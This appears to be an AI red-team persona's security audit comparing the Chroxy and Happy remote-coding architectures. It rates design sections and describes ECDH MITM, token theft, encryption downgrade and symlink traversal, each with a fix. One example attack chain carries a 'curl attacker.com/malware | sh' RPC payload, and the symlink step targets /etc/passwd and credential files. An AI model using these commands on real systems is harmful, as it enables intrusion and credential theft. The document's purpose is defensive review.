# Adversary's Audit: Happy vs Chroxy Architecture

**Agent**: Adversary -- Red teamer who attacks systems for a living
**Overall Rating**: 3.8 / 5
**Date**: 2026-02-19

---

## Section-by-Section Ratings

| # | Section | Rating | Notes |
|---|---------|--------|-------|
| 1 | Topology | 4/5 | Trust boundaries correctly identified, attack surface mapping missing |
| 2 | Wire Protocol | 3/5 | Protocol analysis doesn't cover injection, fuzzing, or malformed messages |
| 3 | Ordering | 4/5 | Ordering attacks (replay, reorder) not considered |
| 4 | Providers | 5/5 | Provider isolation limits blast radius — good security design |
| 5 | Connectivity | 4/5 | Tunnel vs relay attack surfaces well-differentiated |
| 6 | Events | 4/5 | Event spoofing and injection not analyzed |
| 7 | Encryption | 3/5 | Encryption comparison misses key exchange vulnerabilities |
| 8 | State | 4/5 | State manipulation attacks not considered |
| 9 | RPC | 5/5 | Correctly identifies bash RPC as the nuclear option |
| 10 | Feature Matrix | 4/5 | Security comparison is useful but incomplete |

---

## Top 5 Attack Vectors

### 1. Unauthenticated ECDH Key Exchange — Man-in-the-Middle

**Severity**: High (theoretical), Low (practical for Chroxy's threat model)

The ECDH key exchange in `ws-server.js` has no authentication. The exchange works like this:

```
Client → Server: { type: "key_exchange", publicKey: CLIENT_PUB }
Server → Client: { type: "key_exchange", publicKey: SERVER_PUB }
Both sides derive shared secret from ECDH
```

There is no signature, no certificate, no pre-shared secret to verify that the public keys belong to the expected parties. A man-in-the-middle (MITM) attacker can:

```
Client → Attacker: { type: "key_exchange", publicKey: CLIENT_PUB }
Attacker → Server: { type: "key_exchange", publicKey: ATTACKER_PUB_1 }
Server → Attacker: { type: "key_exchange", publicKey: SERVER_PUB }
Attacker → Client: { type: "key_exchange", publicKey: ATTACKER_PUB_2 }

Now attacker has two shared secrets:
  - Client↔Attacker (decrypts client messages)
  - Attacker↔Server (decrypts server messages)
  - Attacker can read and modify all traffic
```

**Practical exploitation**: The attacker needs to be in the Cloudflare tunnel path. For Quick Tunnels, this means compromising Cloudflare's infrastructure (extremely difficult). For Named Tunnels, it means compromising the user's Cloudflare account or DNS (possible but targeted).

**Comparison with Happy**: Happy likely uses authenticated key exchange (certificate pinning or pre-shared keys from account setup). This is stronger but only matters if the relay itself is trusted — and the relay is a bigger attack surface than the tunnel.

**Fix**: Authenticate the key exchange by binding it to the QR code token:

```javascript
// Server: sign the public key with the API token
const signature = crypto.createHmac('sha256', apiToken)
  .update(serverPublicKey).digest('hex')
send({ type: 'key_exchange', publicKey: serverPublicKey, signature })

// Client: verify signature using the token from QR code
const expected = crypto.createHmac('sha256', apiToken)
  .update(serverPublicKey).digest('hex')
if (signature !== expected) {
  // MITM detected — abort connection
}
```

### 2. QR Code Token Theft — Static Bearer Token

**Severity**: Medium

The QR code contains a static API token: `chroxy://hostname?token=API_TOKEN`. This token:
- Never rotates
- Never expires
- Cannot be revoked without restarting the server
- Is displayed on screen (shoulder surfing risk)
- Is stored in the app (device theft risk)

**Attack scenarios**:
1. **Shoulder surfing**: Someone photographs the QR code displayed on your terminal
2. **Device theft**: Someone steals your phone and extracts the token from app storage
3. **Screenshot leak**: QR code screenshot accidentally shared (Slack, email, etc.)
4. **Clipboard leak**: Token copied to clipboard, picked up by another app

**Exploitation**: With the token, an attacker can:
- Connect to the Chroxy server
- See all Claude Code output (code, conversations, tool results)
- Send messages to Claude Code (as the user)
- Approve or deny permission requests
- Browse files on the server

**Comparison with Happy**: Happy uses account-based authentication with rotating session tokens. Token theft gives access to a single session, not permanent access.

**Fix (incremental)**:
1. **Token rotation**: Generate new token on each server start (already happens with Quick Tunnel URLs)
2. **Token expiration**: Add a 24-hour TTL, require re-scan daily
3. **Token revocation**: Add a `chroxy revoke` command that invalidates the current token
4. **Device binding**: After first connection, bind the token to the device's public key

### 3. Silent Encryption Downgrade — 5s Timeout Falls Back to Plaintext

**Severity**: High

In `ws-server.js`, if the ECDH key exchange doesn't complete within 5 seconds, the server silently falls back to plaintext communication:

```javascript
// Simplified from ws-server.js
setTimeout(() => {
  if (!this._encryptionEstablished) {
    this._log('Key exchange timed out, continuing without encryption')
    this._encryptionEnabled = false
    // Connection continues in plaintext — NO WARNING TO USER
  }
}, 5000)
```

**Attack**: An attacker can cause the key exchange to fail (drop the key_exchange messages, delay them past 5s) and force the connection to plaintext. Neither the server nor the client alerts the user.

**Exploitation scenario**:
1. Attacker positions on the network path (corporate proxy, rogue WiFi)
2. Attacker drops `key_exchange` messages in both directions
3. 5-second timeout expires on both sides
4. Both sides fall back to plaintext
5. All subsequent messages are readable by the attacker
6. Neither the server nor the app shows any warning

**Fix**: Never silently downgrade. Three options:
1. **Fail closed**: If key exchange fails, disconnect. User must re-scan QR code.
2. **Warn loudly**: Show a prominent "UNENCRYPTED CONNECTION" banner in the app.
3. **Retry**: Retry the key exchange 3 times before failing. (Preferred — handles temporary network issues.)

### 4. Symlink Bypass in File Browser

**Severity**: Medium

The file browser uses `path.normalize()` + `startsWith()` for path traversal prevention. This doesn't resolve symlinks:

```javascript
// In file-browser.js
const resolved = path.normalize(path.join(baseDir, requestedPath))
if (!resolved.startsWith(baseDir)) {
  throw new Error('Path traversal')
}
// But what if resolved is a symlink to /etc/shadow?
const content = fs.readFileSync(resolved) // Follows symlink!
```

**Attack**:
1. Create a symlink in the project directory: `ln -s /etc/passwd ~/project/innocent-file`
2. Request `innocent-file` via file browser
3. Path check passes (normalized path is under `~/project/`)
4. `readFileSync` follows the symlink and reads `/etc/passwd`

**Scope**: Read-only access to ANY file the server process can read. This includes:
- `/etc/passwd`, `/etc/shadow` (if running as root, which you shouldn't)
- `~/.ssh/id_rsa` (SSH private keys)
- `~/.aws/credentials` (AWS credentials)
- `~/.gnupg/` (GPG keys)
- Other project directories outside the allowed path

**Mitigation factors**:
- The attacker needs an existing symlink in the project directory OR the ability to create one
- The server typically doesn't run as root
- The file browser is read-only (can't create symlinks through it)

**Fix**:
```javascript
const resolved = fs.realpathSync(path.normalize(path.join(baseDir, requestedPath)))
const realBase = fs.realpathSync(baseDir)
if (!resolved.startsWith(realBase)) {
  throw new Error('Path traversal via symlink')
}
```

### 5. Happy's Bash RPC = Arbitrary Code Execution

**Severity**: Critical (for Happy)

The document describes Happy's RPC layer which includes bash command execution. From a red team perspective, this is the single most dangerous feature in either architecture:

**Attack chain if relay is compromised**:
```
1. Attacker compromises Happy relay server (or employee account)
2. Attacker sends RPC command: { "type": "rpc", "method": "bash", "command": "curl attacker.com/malware | sh" }
3. Every connected Happy agent executes the command
4. Attacker has shell access to every developer's machine
```

**Attack chain if client is compromised**:
```
1. Attacker compromises user's phone (malware, stolen device)
2. Attacker sends RPC command through Happy app
3. Agent executes arbitrary commands on the dev machine
```

**Blast radius**: Every machine running a Happy agent is vulnerable. In a company with 100 developers, a single relay compromise gives access to 100 machines.

**Comparison with Chroxy**: Chroxy has NO RPC layer. All mutations go through Claude Code's audited tool system, which has:
- Permission prompts for dangerous operations
- User-configurable permission modes
- No arbitrary bash execution endpoint
- File browser is read-only

**Verdict**: Chroxy's lack of RPC is a security feature, not a limitation. DO NOT add bash RPC.

---

## Head-to-Head Security Comparison

| Attack Vector | Chroxy | Happy | Winner |
|---|---|---|---|
| MITM on key exchange | Vulnerable (unauthenticated ECDH) | Likely authenticated | Happy |
| Token theft | Static token, no rotation | Rotating session tokens | Happy |
| Encryption downgrade | Silent fallback to plaintext | Unknown | Unknown |
| Path traversal | Symlink bypass (read-only) | Unknown | Tie |
| Arbitrary code execution | Not possible (no RPC) | Bash RPC = full shell | Chroxy |
| Relay compromise | N/A (no relay) | Catastrophic (all agents) | Chroxy |
| Data at rest | JSON files, no encryption | Unknown | Tie |
| Permission bypass | Not possible (Claude Code enforced) | RPC bypasses permissions | Chroxy |
| Supply chain | npm dependencies | npm dependencies | Tie |
| Privilege escalation | Not possible (server is user-level) | RPC to root? | Chroxy |

**Overall**: Chroxy has a **smaller attack surface** with **lower blast radius**. Happy has **stronger crypto** but **catastrophic RPC risk**. For the single-developer threat model, Chroxy's security posture is better overall.

---

## Attack Surface Map

### Chroxy Attack Surface

```
┌─────────────────────────────────────────┐
│                 CHROXY                   │
├─────────────────────────────────────────┤
│ Entry Points:                           │
│  1. WebSocket (primary)                 │
│  2. HTTP health endpoint (unauthenticated)│
│  3. QR code token (physical/visual)      │
│  4. File browser (symlink bypass)        │
│                                          │
│ Trust Boundaries:                        │
│  A. Client ↔ Cloudflare (TLS)           │
│  B. Cloudflare ↔ Server (tunnel)        │
│  C. Server ↔ Claude Code (local)        │
│                                          │
│ Data in Transit:                         │
│  - Encrypted (ECDH + AES-GCM)          │
│  - OR plaintext (if downgrade)          │
│                                          │
│ Data at Rest:                            │
│  - JSON session files (unencrypted)     │
│  - Config files (tokens in plaintext)   │
│                                          │
│ Blast Radius:                            │
│  - Single machine (tunnel owner)        │
│  - Read-only file access                │
│  - Claude Code permissions only         │
└─────────────────────────────────────────┘
```

### Happy Attack Surface (Estimated)

```
┌─────────────────────────────────────────┐
│                  HAPPY                   │
├─────────────────────────────────────────┤
│ Entry Points:                           │
│  1. WebSocket (client ↔ relay)          │
│  2. WebSocket (relay ↔ agent)           │
│  3. HTTP API (account management)        │
│  4. RPC endpoint (bash execution!)       │
│  5. Authentication system                │
│                                          │
│ Trust Boundaries:                        │
│  A. Client ↔ Relay (TLS + E2E)         │
│  B. Relay ↔ Agent (TLS + E2E)          │
│  C. Agent ↔ Claude Code (local)        │
│  D. Relay ↔ Database (internal)        │
│                                          │
│ Data in Transit:                         │
│  - E2E encrypted (relay can't read)    │
│  - Metadata visible to relay            │
│                                          │
│ Data at Rest:                            │
│  - Database (messages, sessions)        │
│  - Redis (queues, state)                │
│  - User accounts + credentials          │
│                                          │
│ Blast Radius:                            │
│  - ALL connected machines (via RPC)     │
│  - ALL user data (via relay compromise) │
│  - Arbitrary code execution             │
└─────────────────────────────────────────┘
```

---

## Recommendations

| Priority | Action | Effort | Risk Reduced |
|----------|--------|--------|-------------|
| P0 | Fix symlink bypass (use realpathSync) | 30 min | Filesystem read escape |
| P0 | Remove silent encryption downgrade | 2 hours | Plaintext data exposure |
| P1 | Authenticate ECDH key exchange (HMAC with token) | 4 hours | MITM on key exchange |
| P1 | Add token rotation (new token per restart) | 2 hours | Token theft window |
| P2 | Add token expiration (24h TTL) | 2 hours | Long-term token compromise |
| P2 | Encrypt session files at rest | 4 hours | Device theft / file access |
| P3 | Add token revocation command | 2 hours | Active token compromise |
| P3 | Add connection audit log | 2 hours | Forensics after breach |
| P3 | Rate limit authentication attempts | 1 hour | Token brute force |

---

## Verdict

From a red team perspective, Chroxy has a **fundamentally smaller attack surface** than Happy. The absence of RPC is the single biggest security advantage — it means even a fully compromised connection cannot execute arbitrary code on the server. All mutations must go through Claude Code's permission system.

The identified vulnerabilities (ECDH MITM, token theft, encryption downgrade, symlink bypass) are real but have limited impact in Chroxy's threat model (single user, own machine, trusted network). The ECDH MITM requires compromising Cloudflare infrastructure. Token theft requires physical access or social engineering. The encryption downgrade requires network-level positioning. The symlink bypass requires pre-existing symlinks.

Happy's bash RPC, by contrast, is a **catastrophic** vulnerability if the relay is compromised. A single relay breach gives an attacker shell access to every connected machine. This is the kind of vulnerability that ends companies.

**Bottom line**: For a single-developer dev tool, Chroxy has the better security posture. Fix the four identified bugs, and the remaining attack surface is minimal. Do NOT add RPC — it's the one architectural decision that would dramatically worsen Chroxy's security.
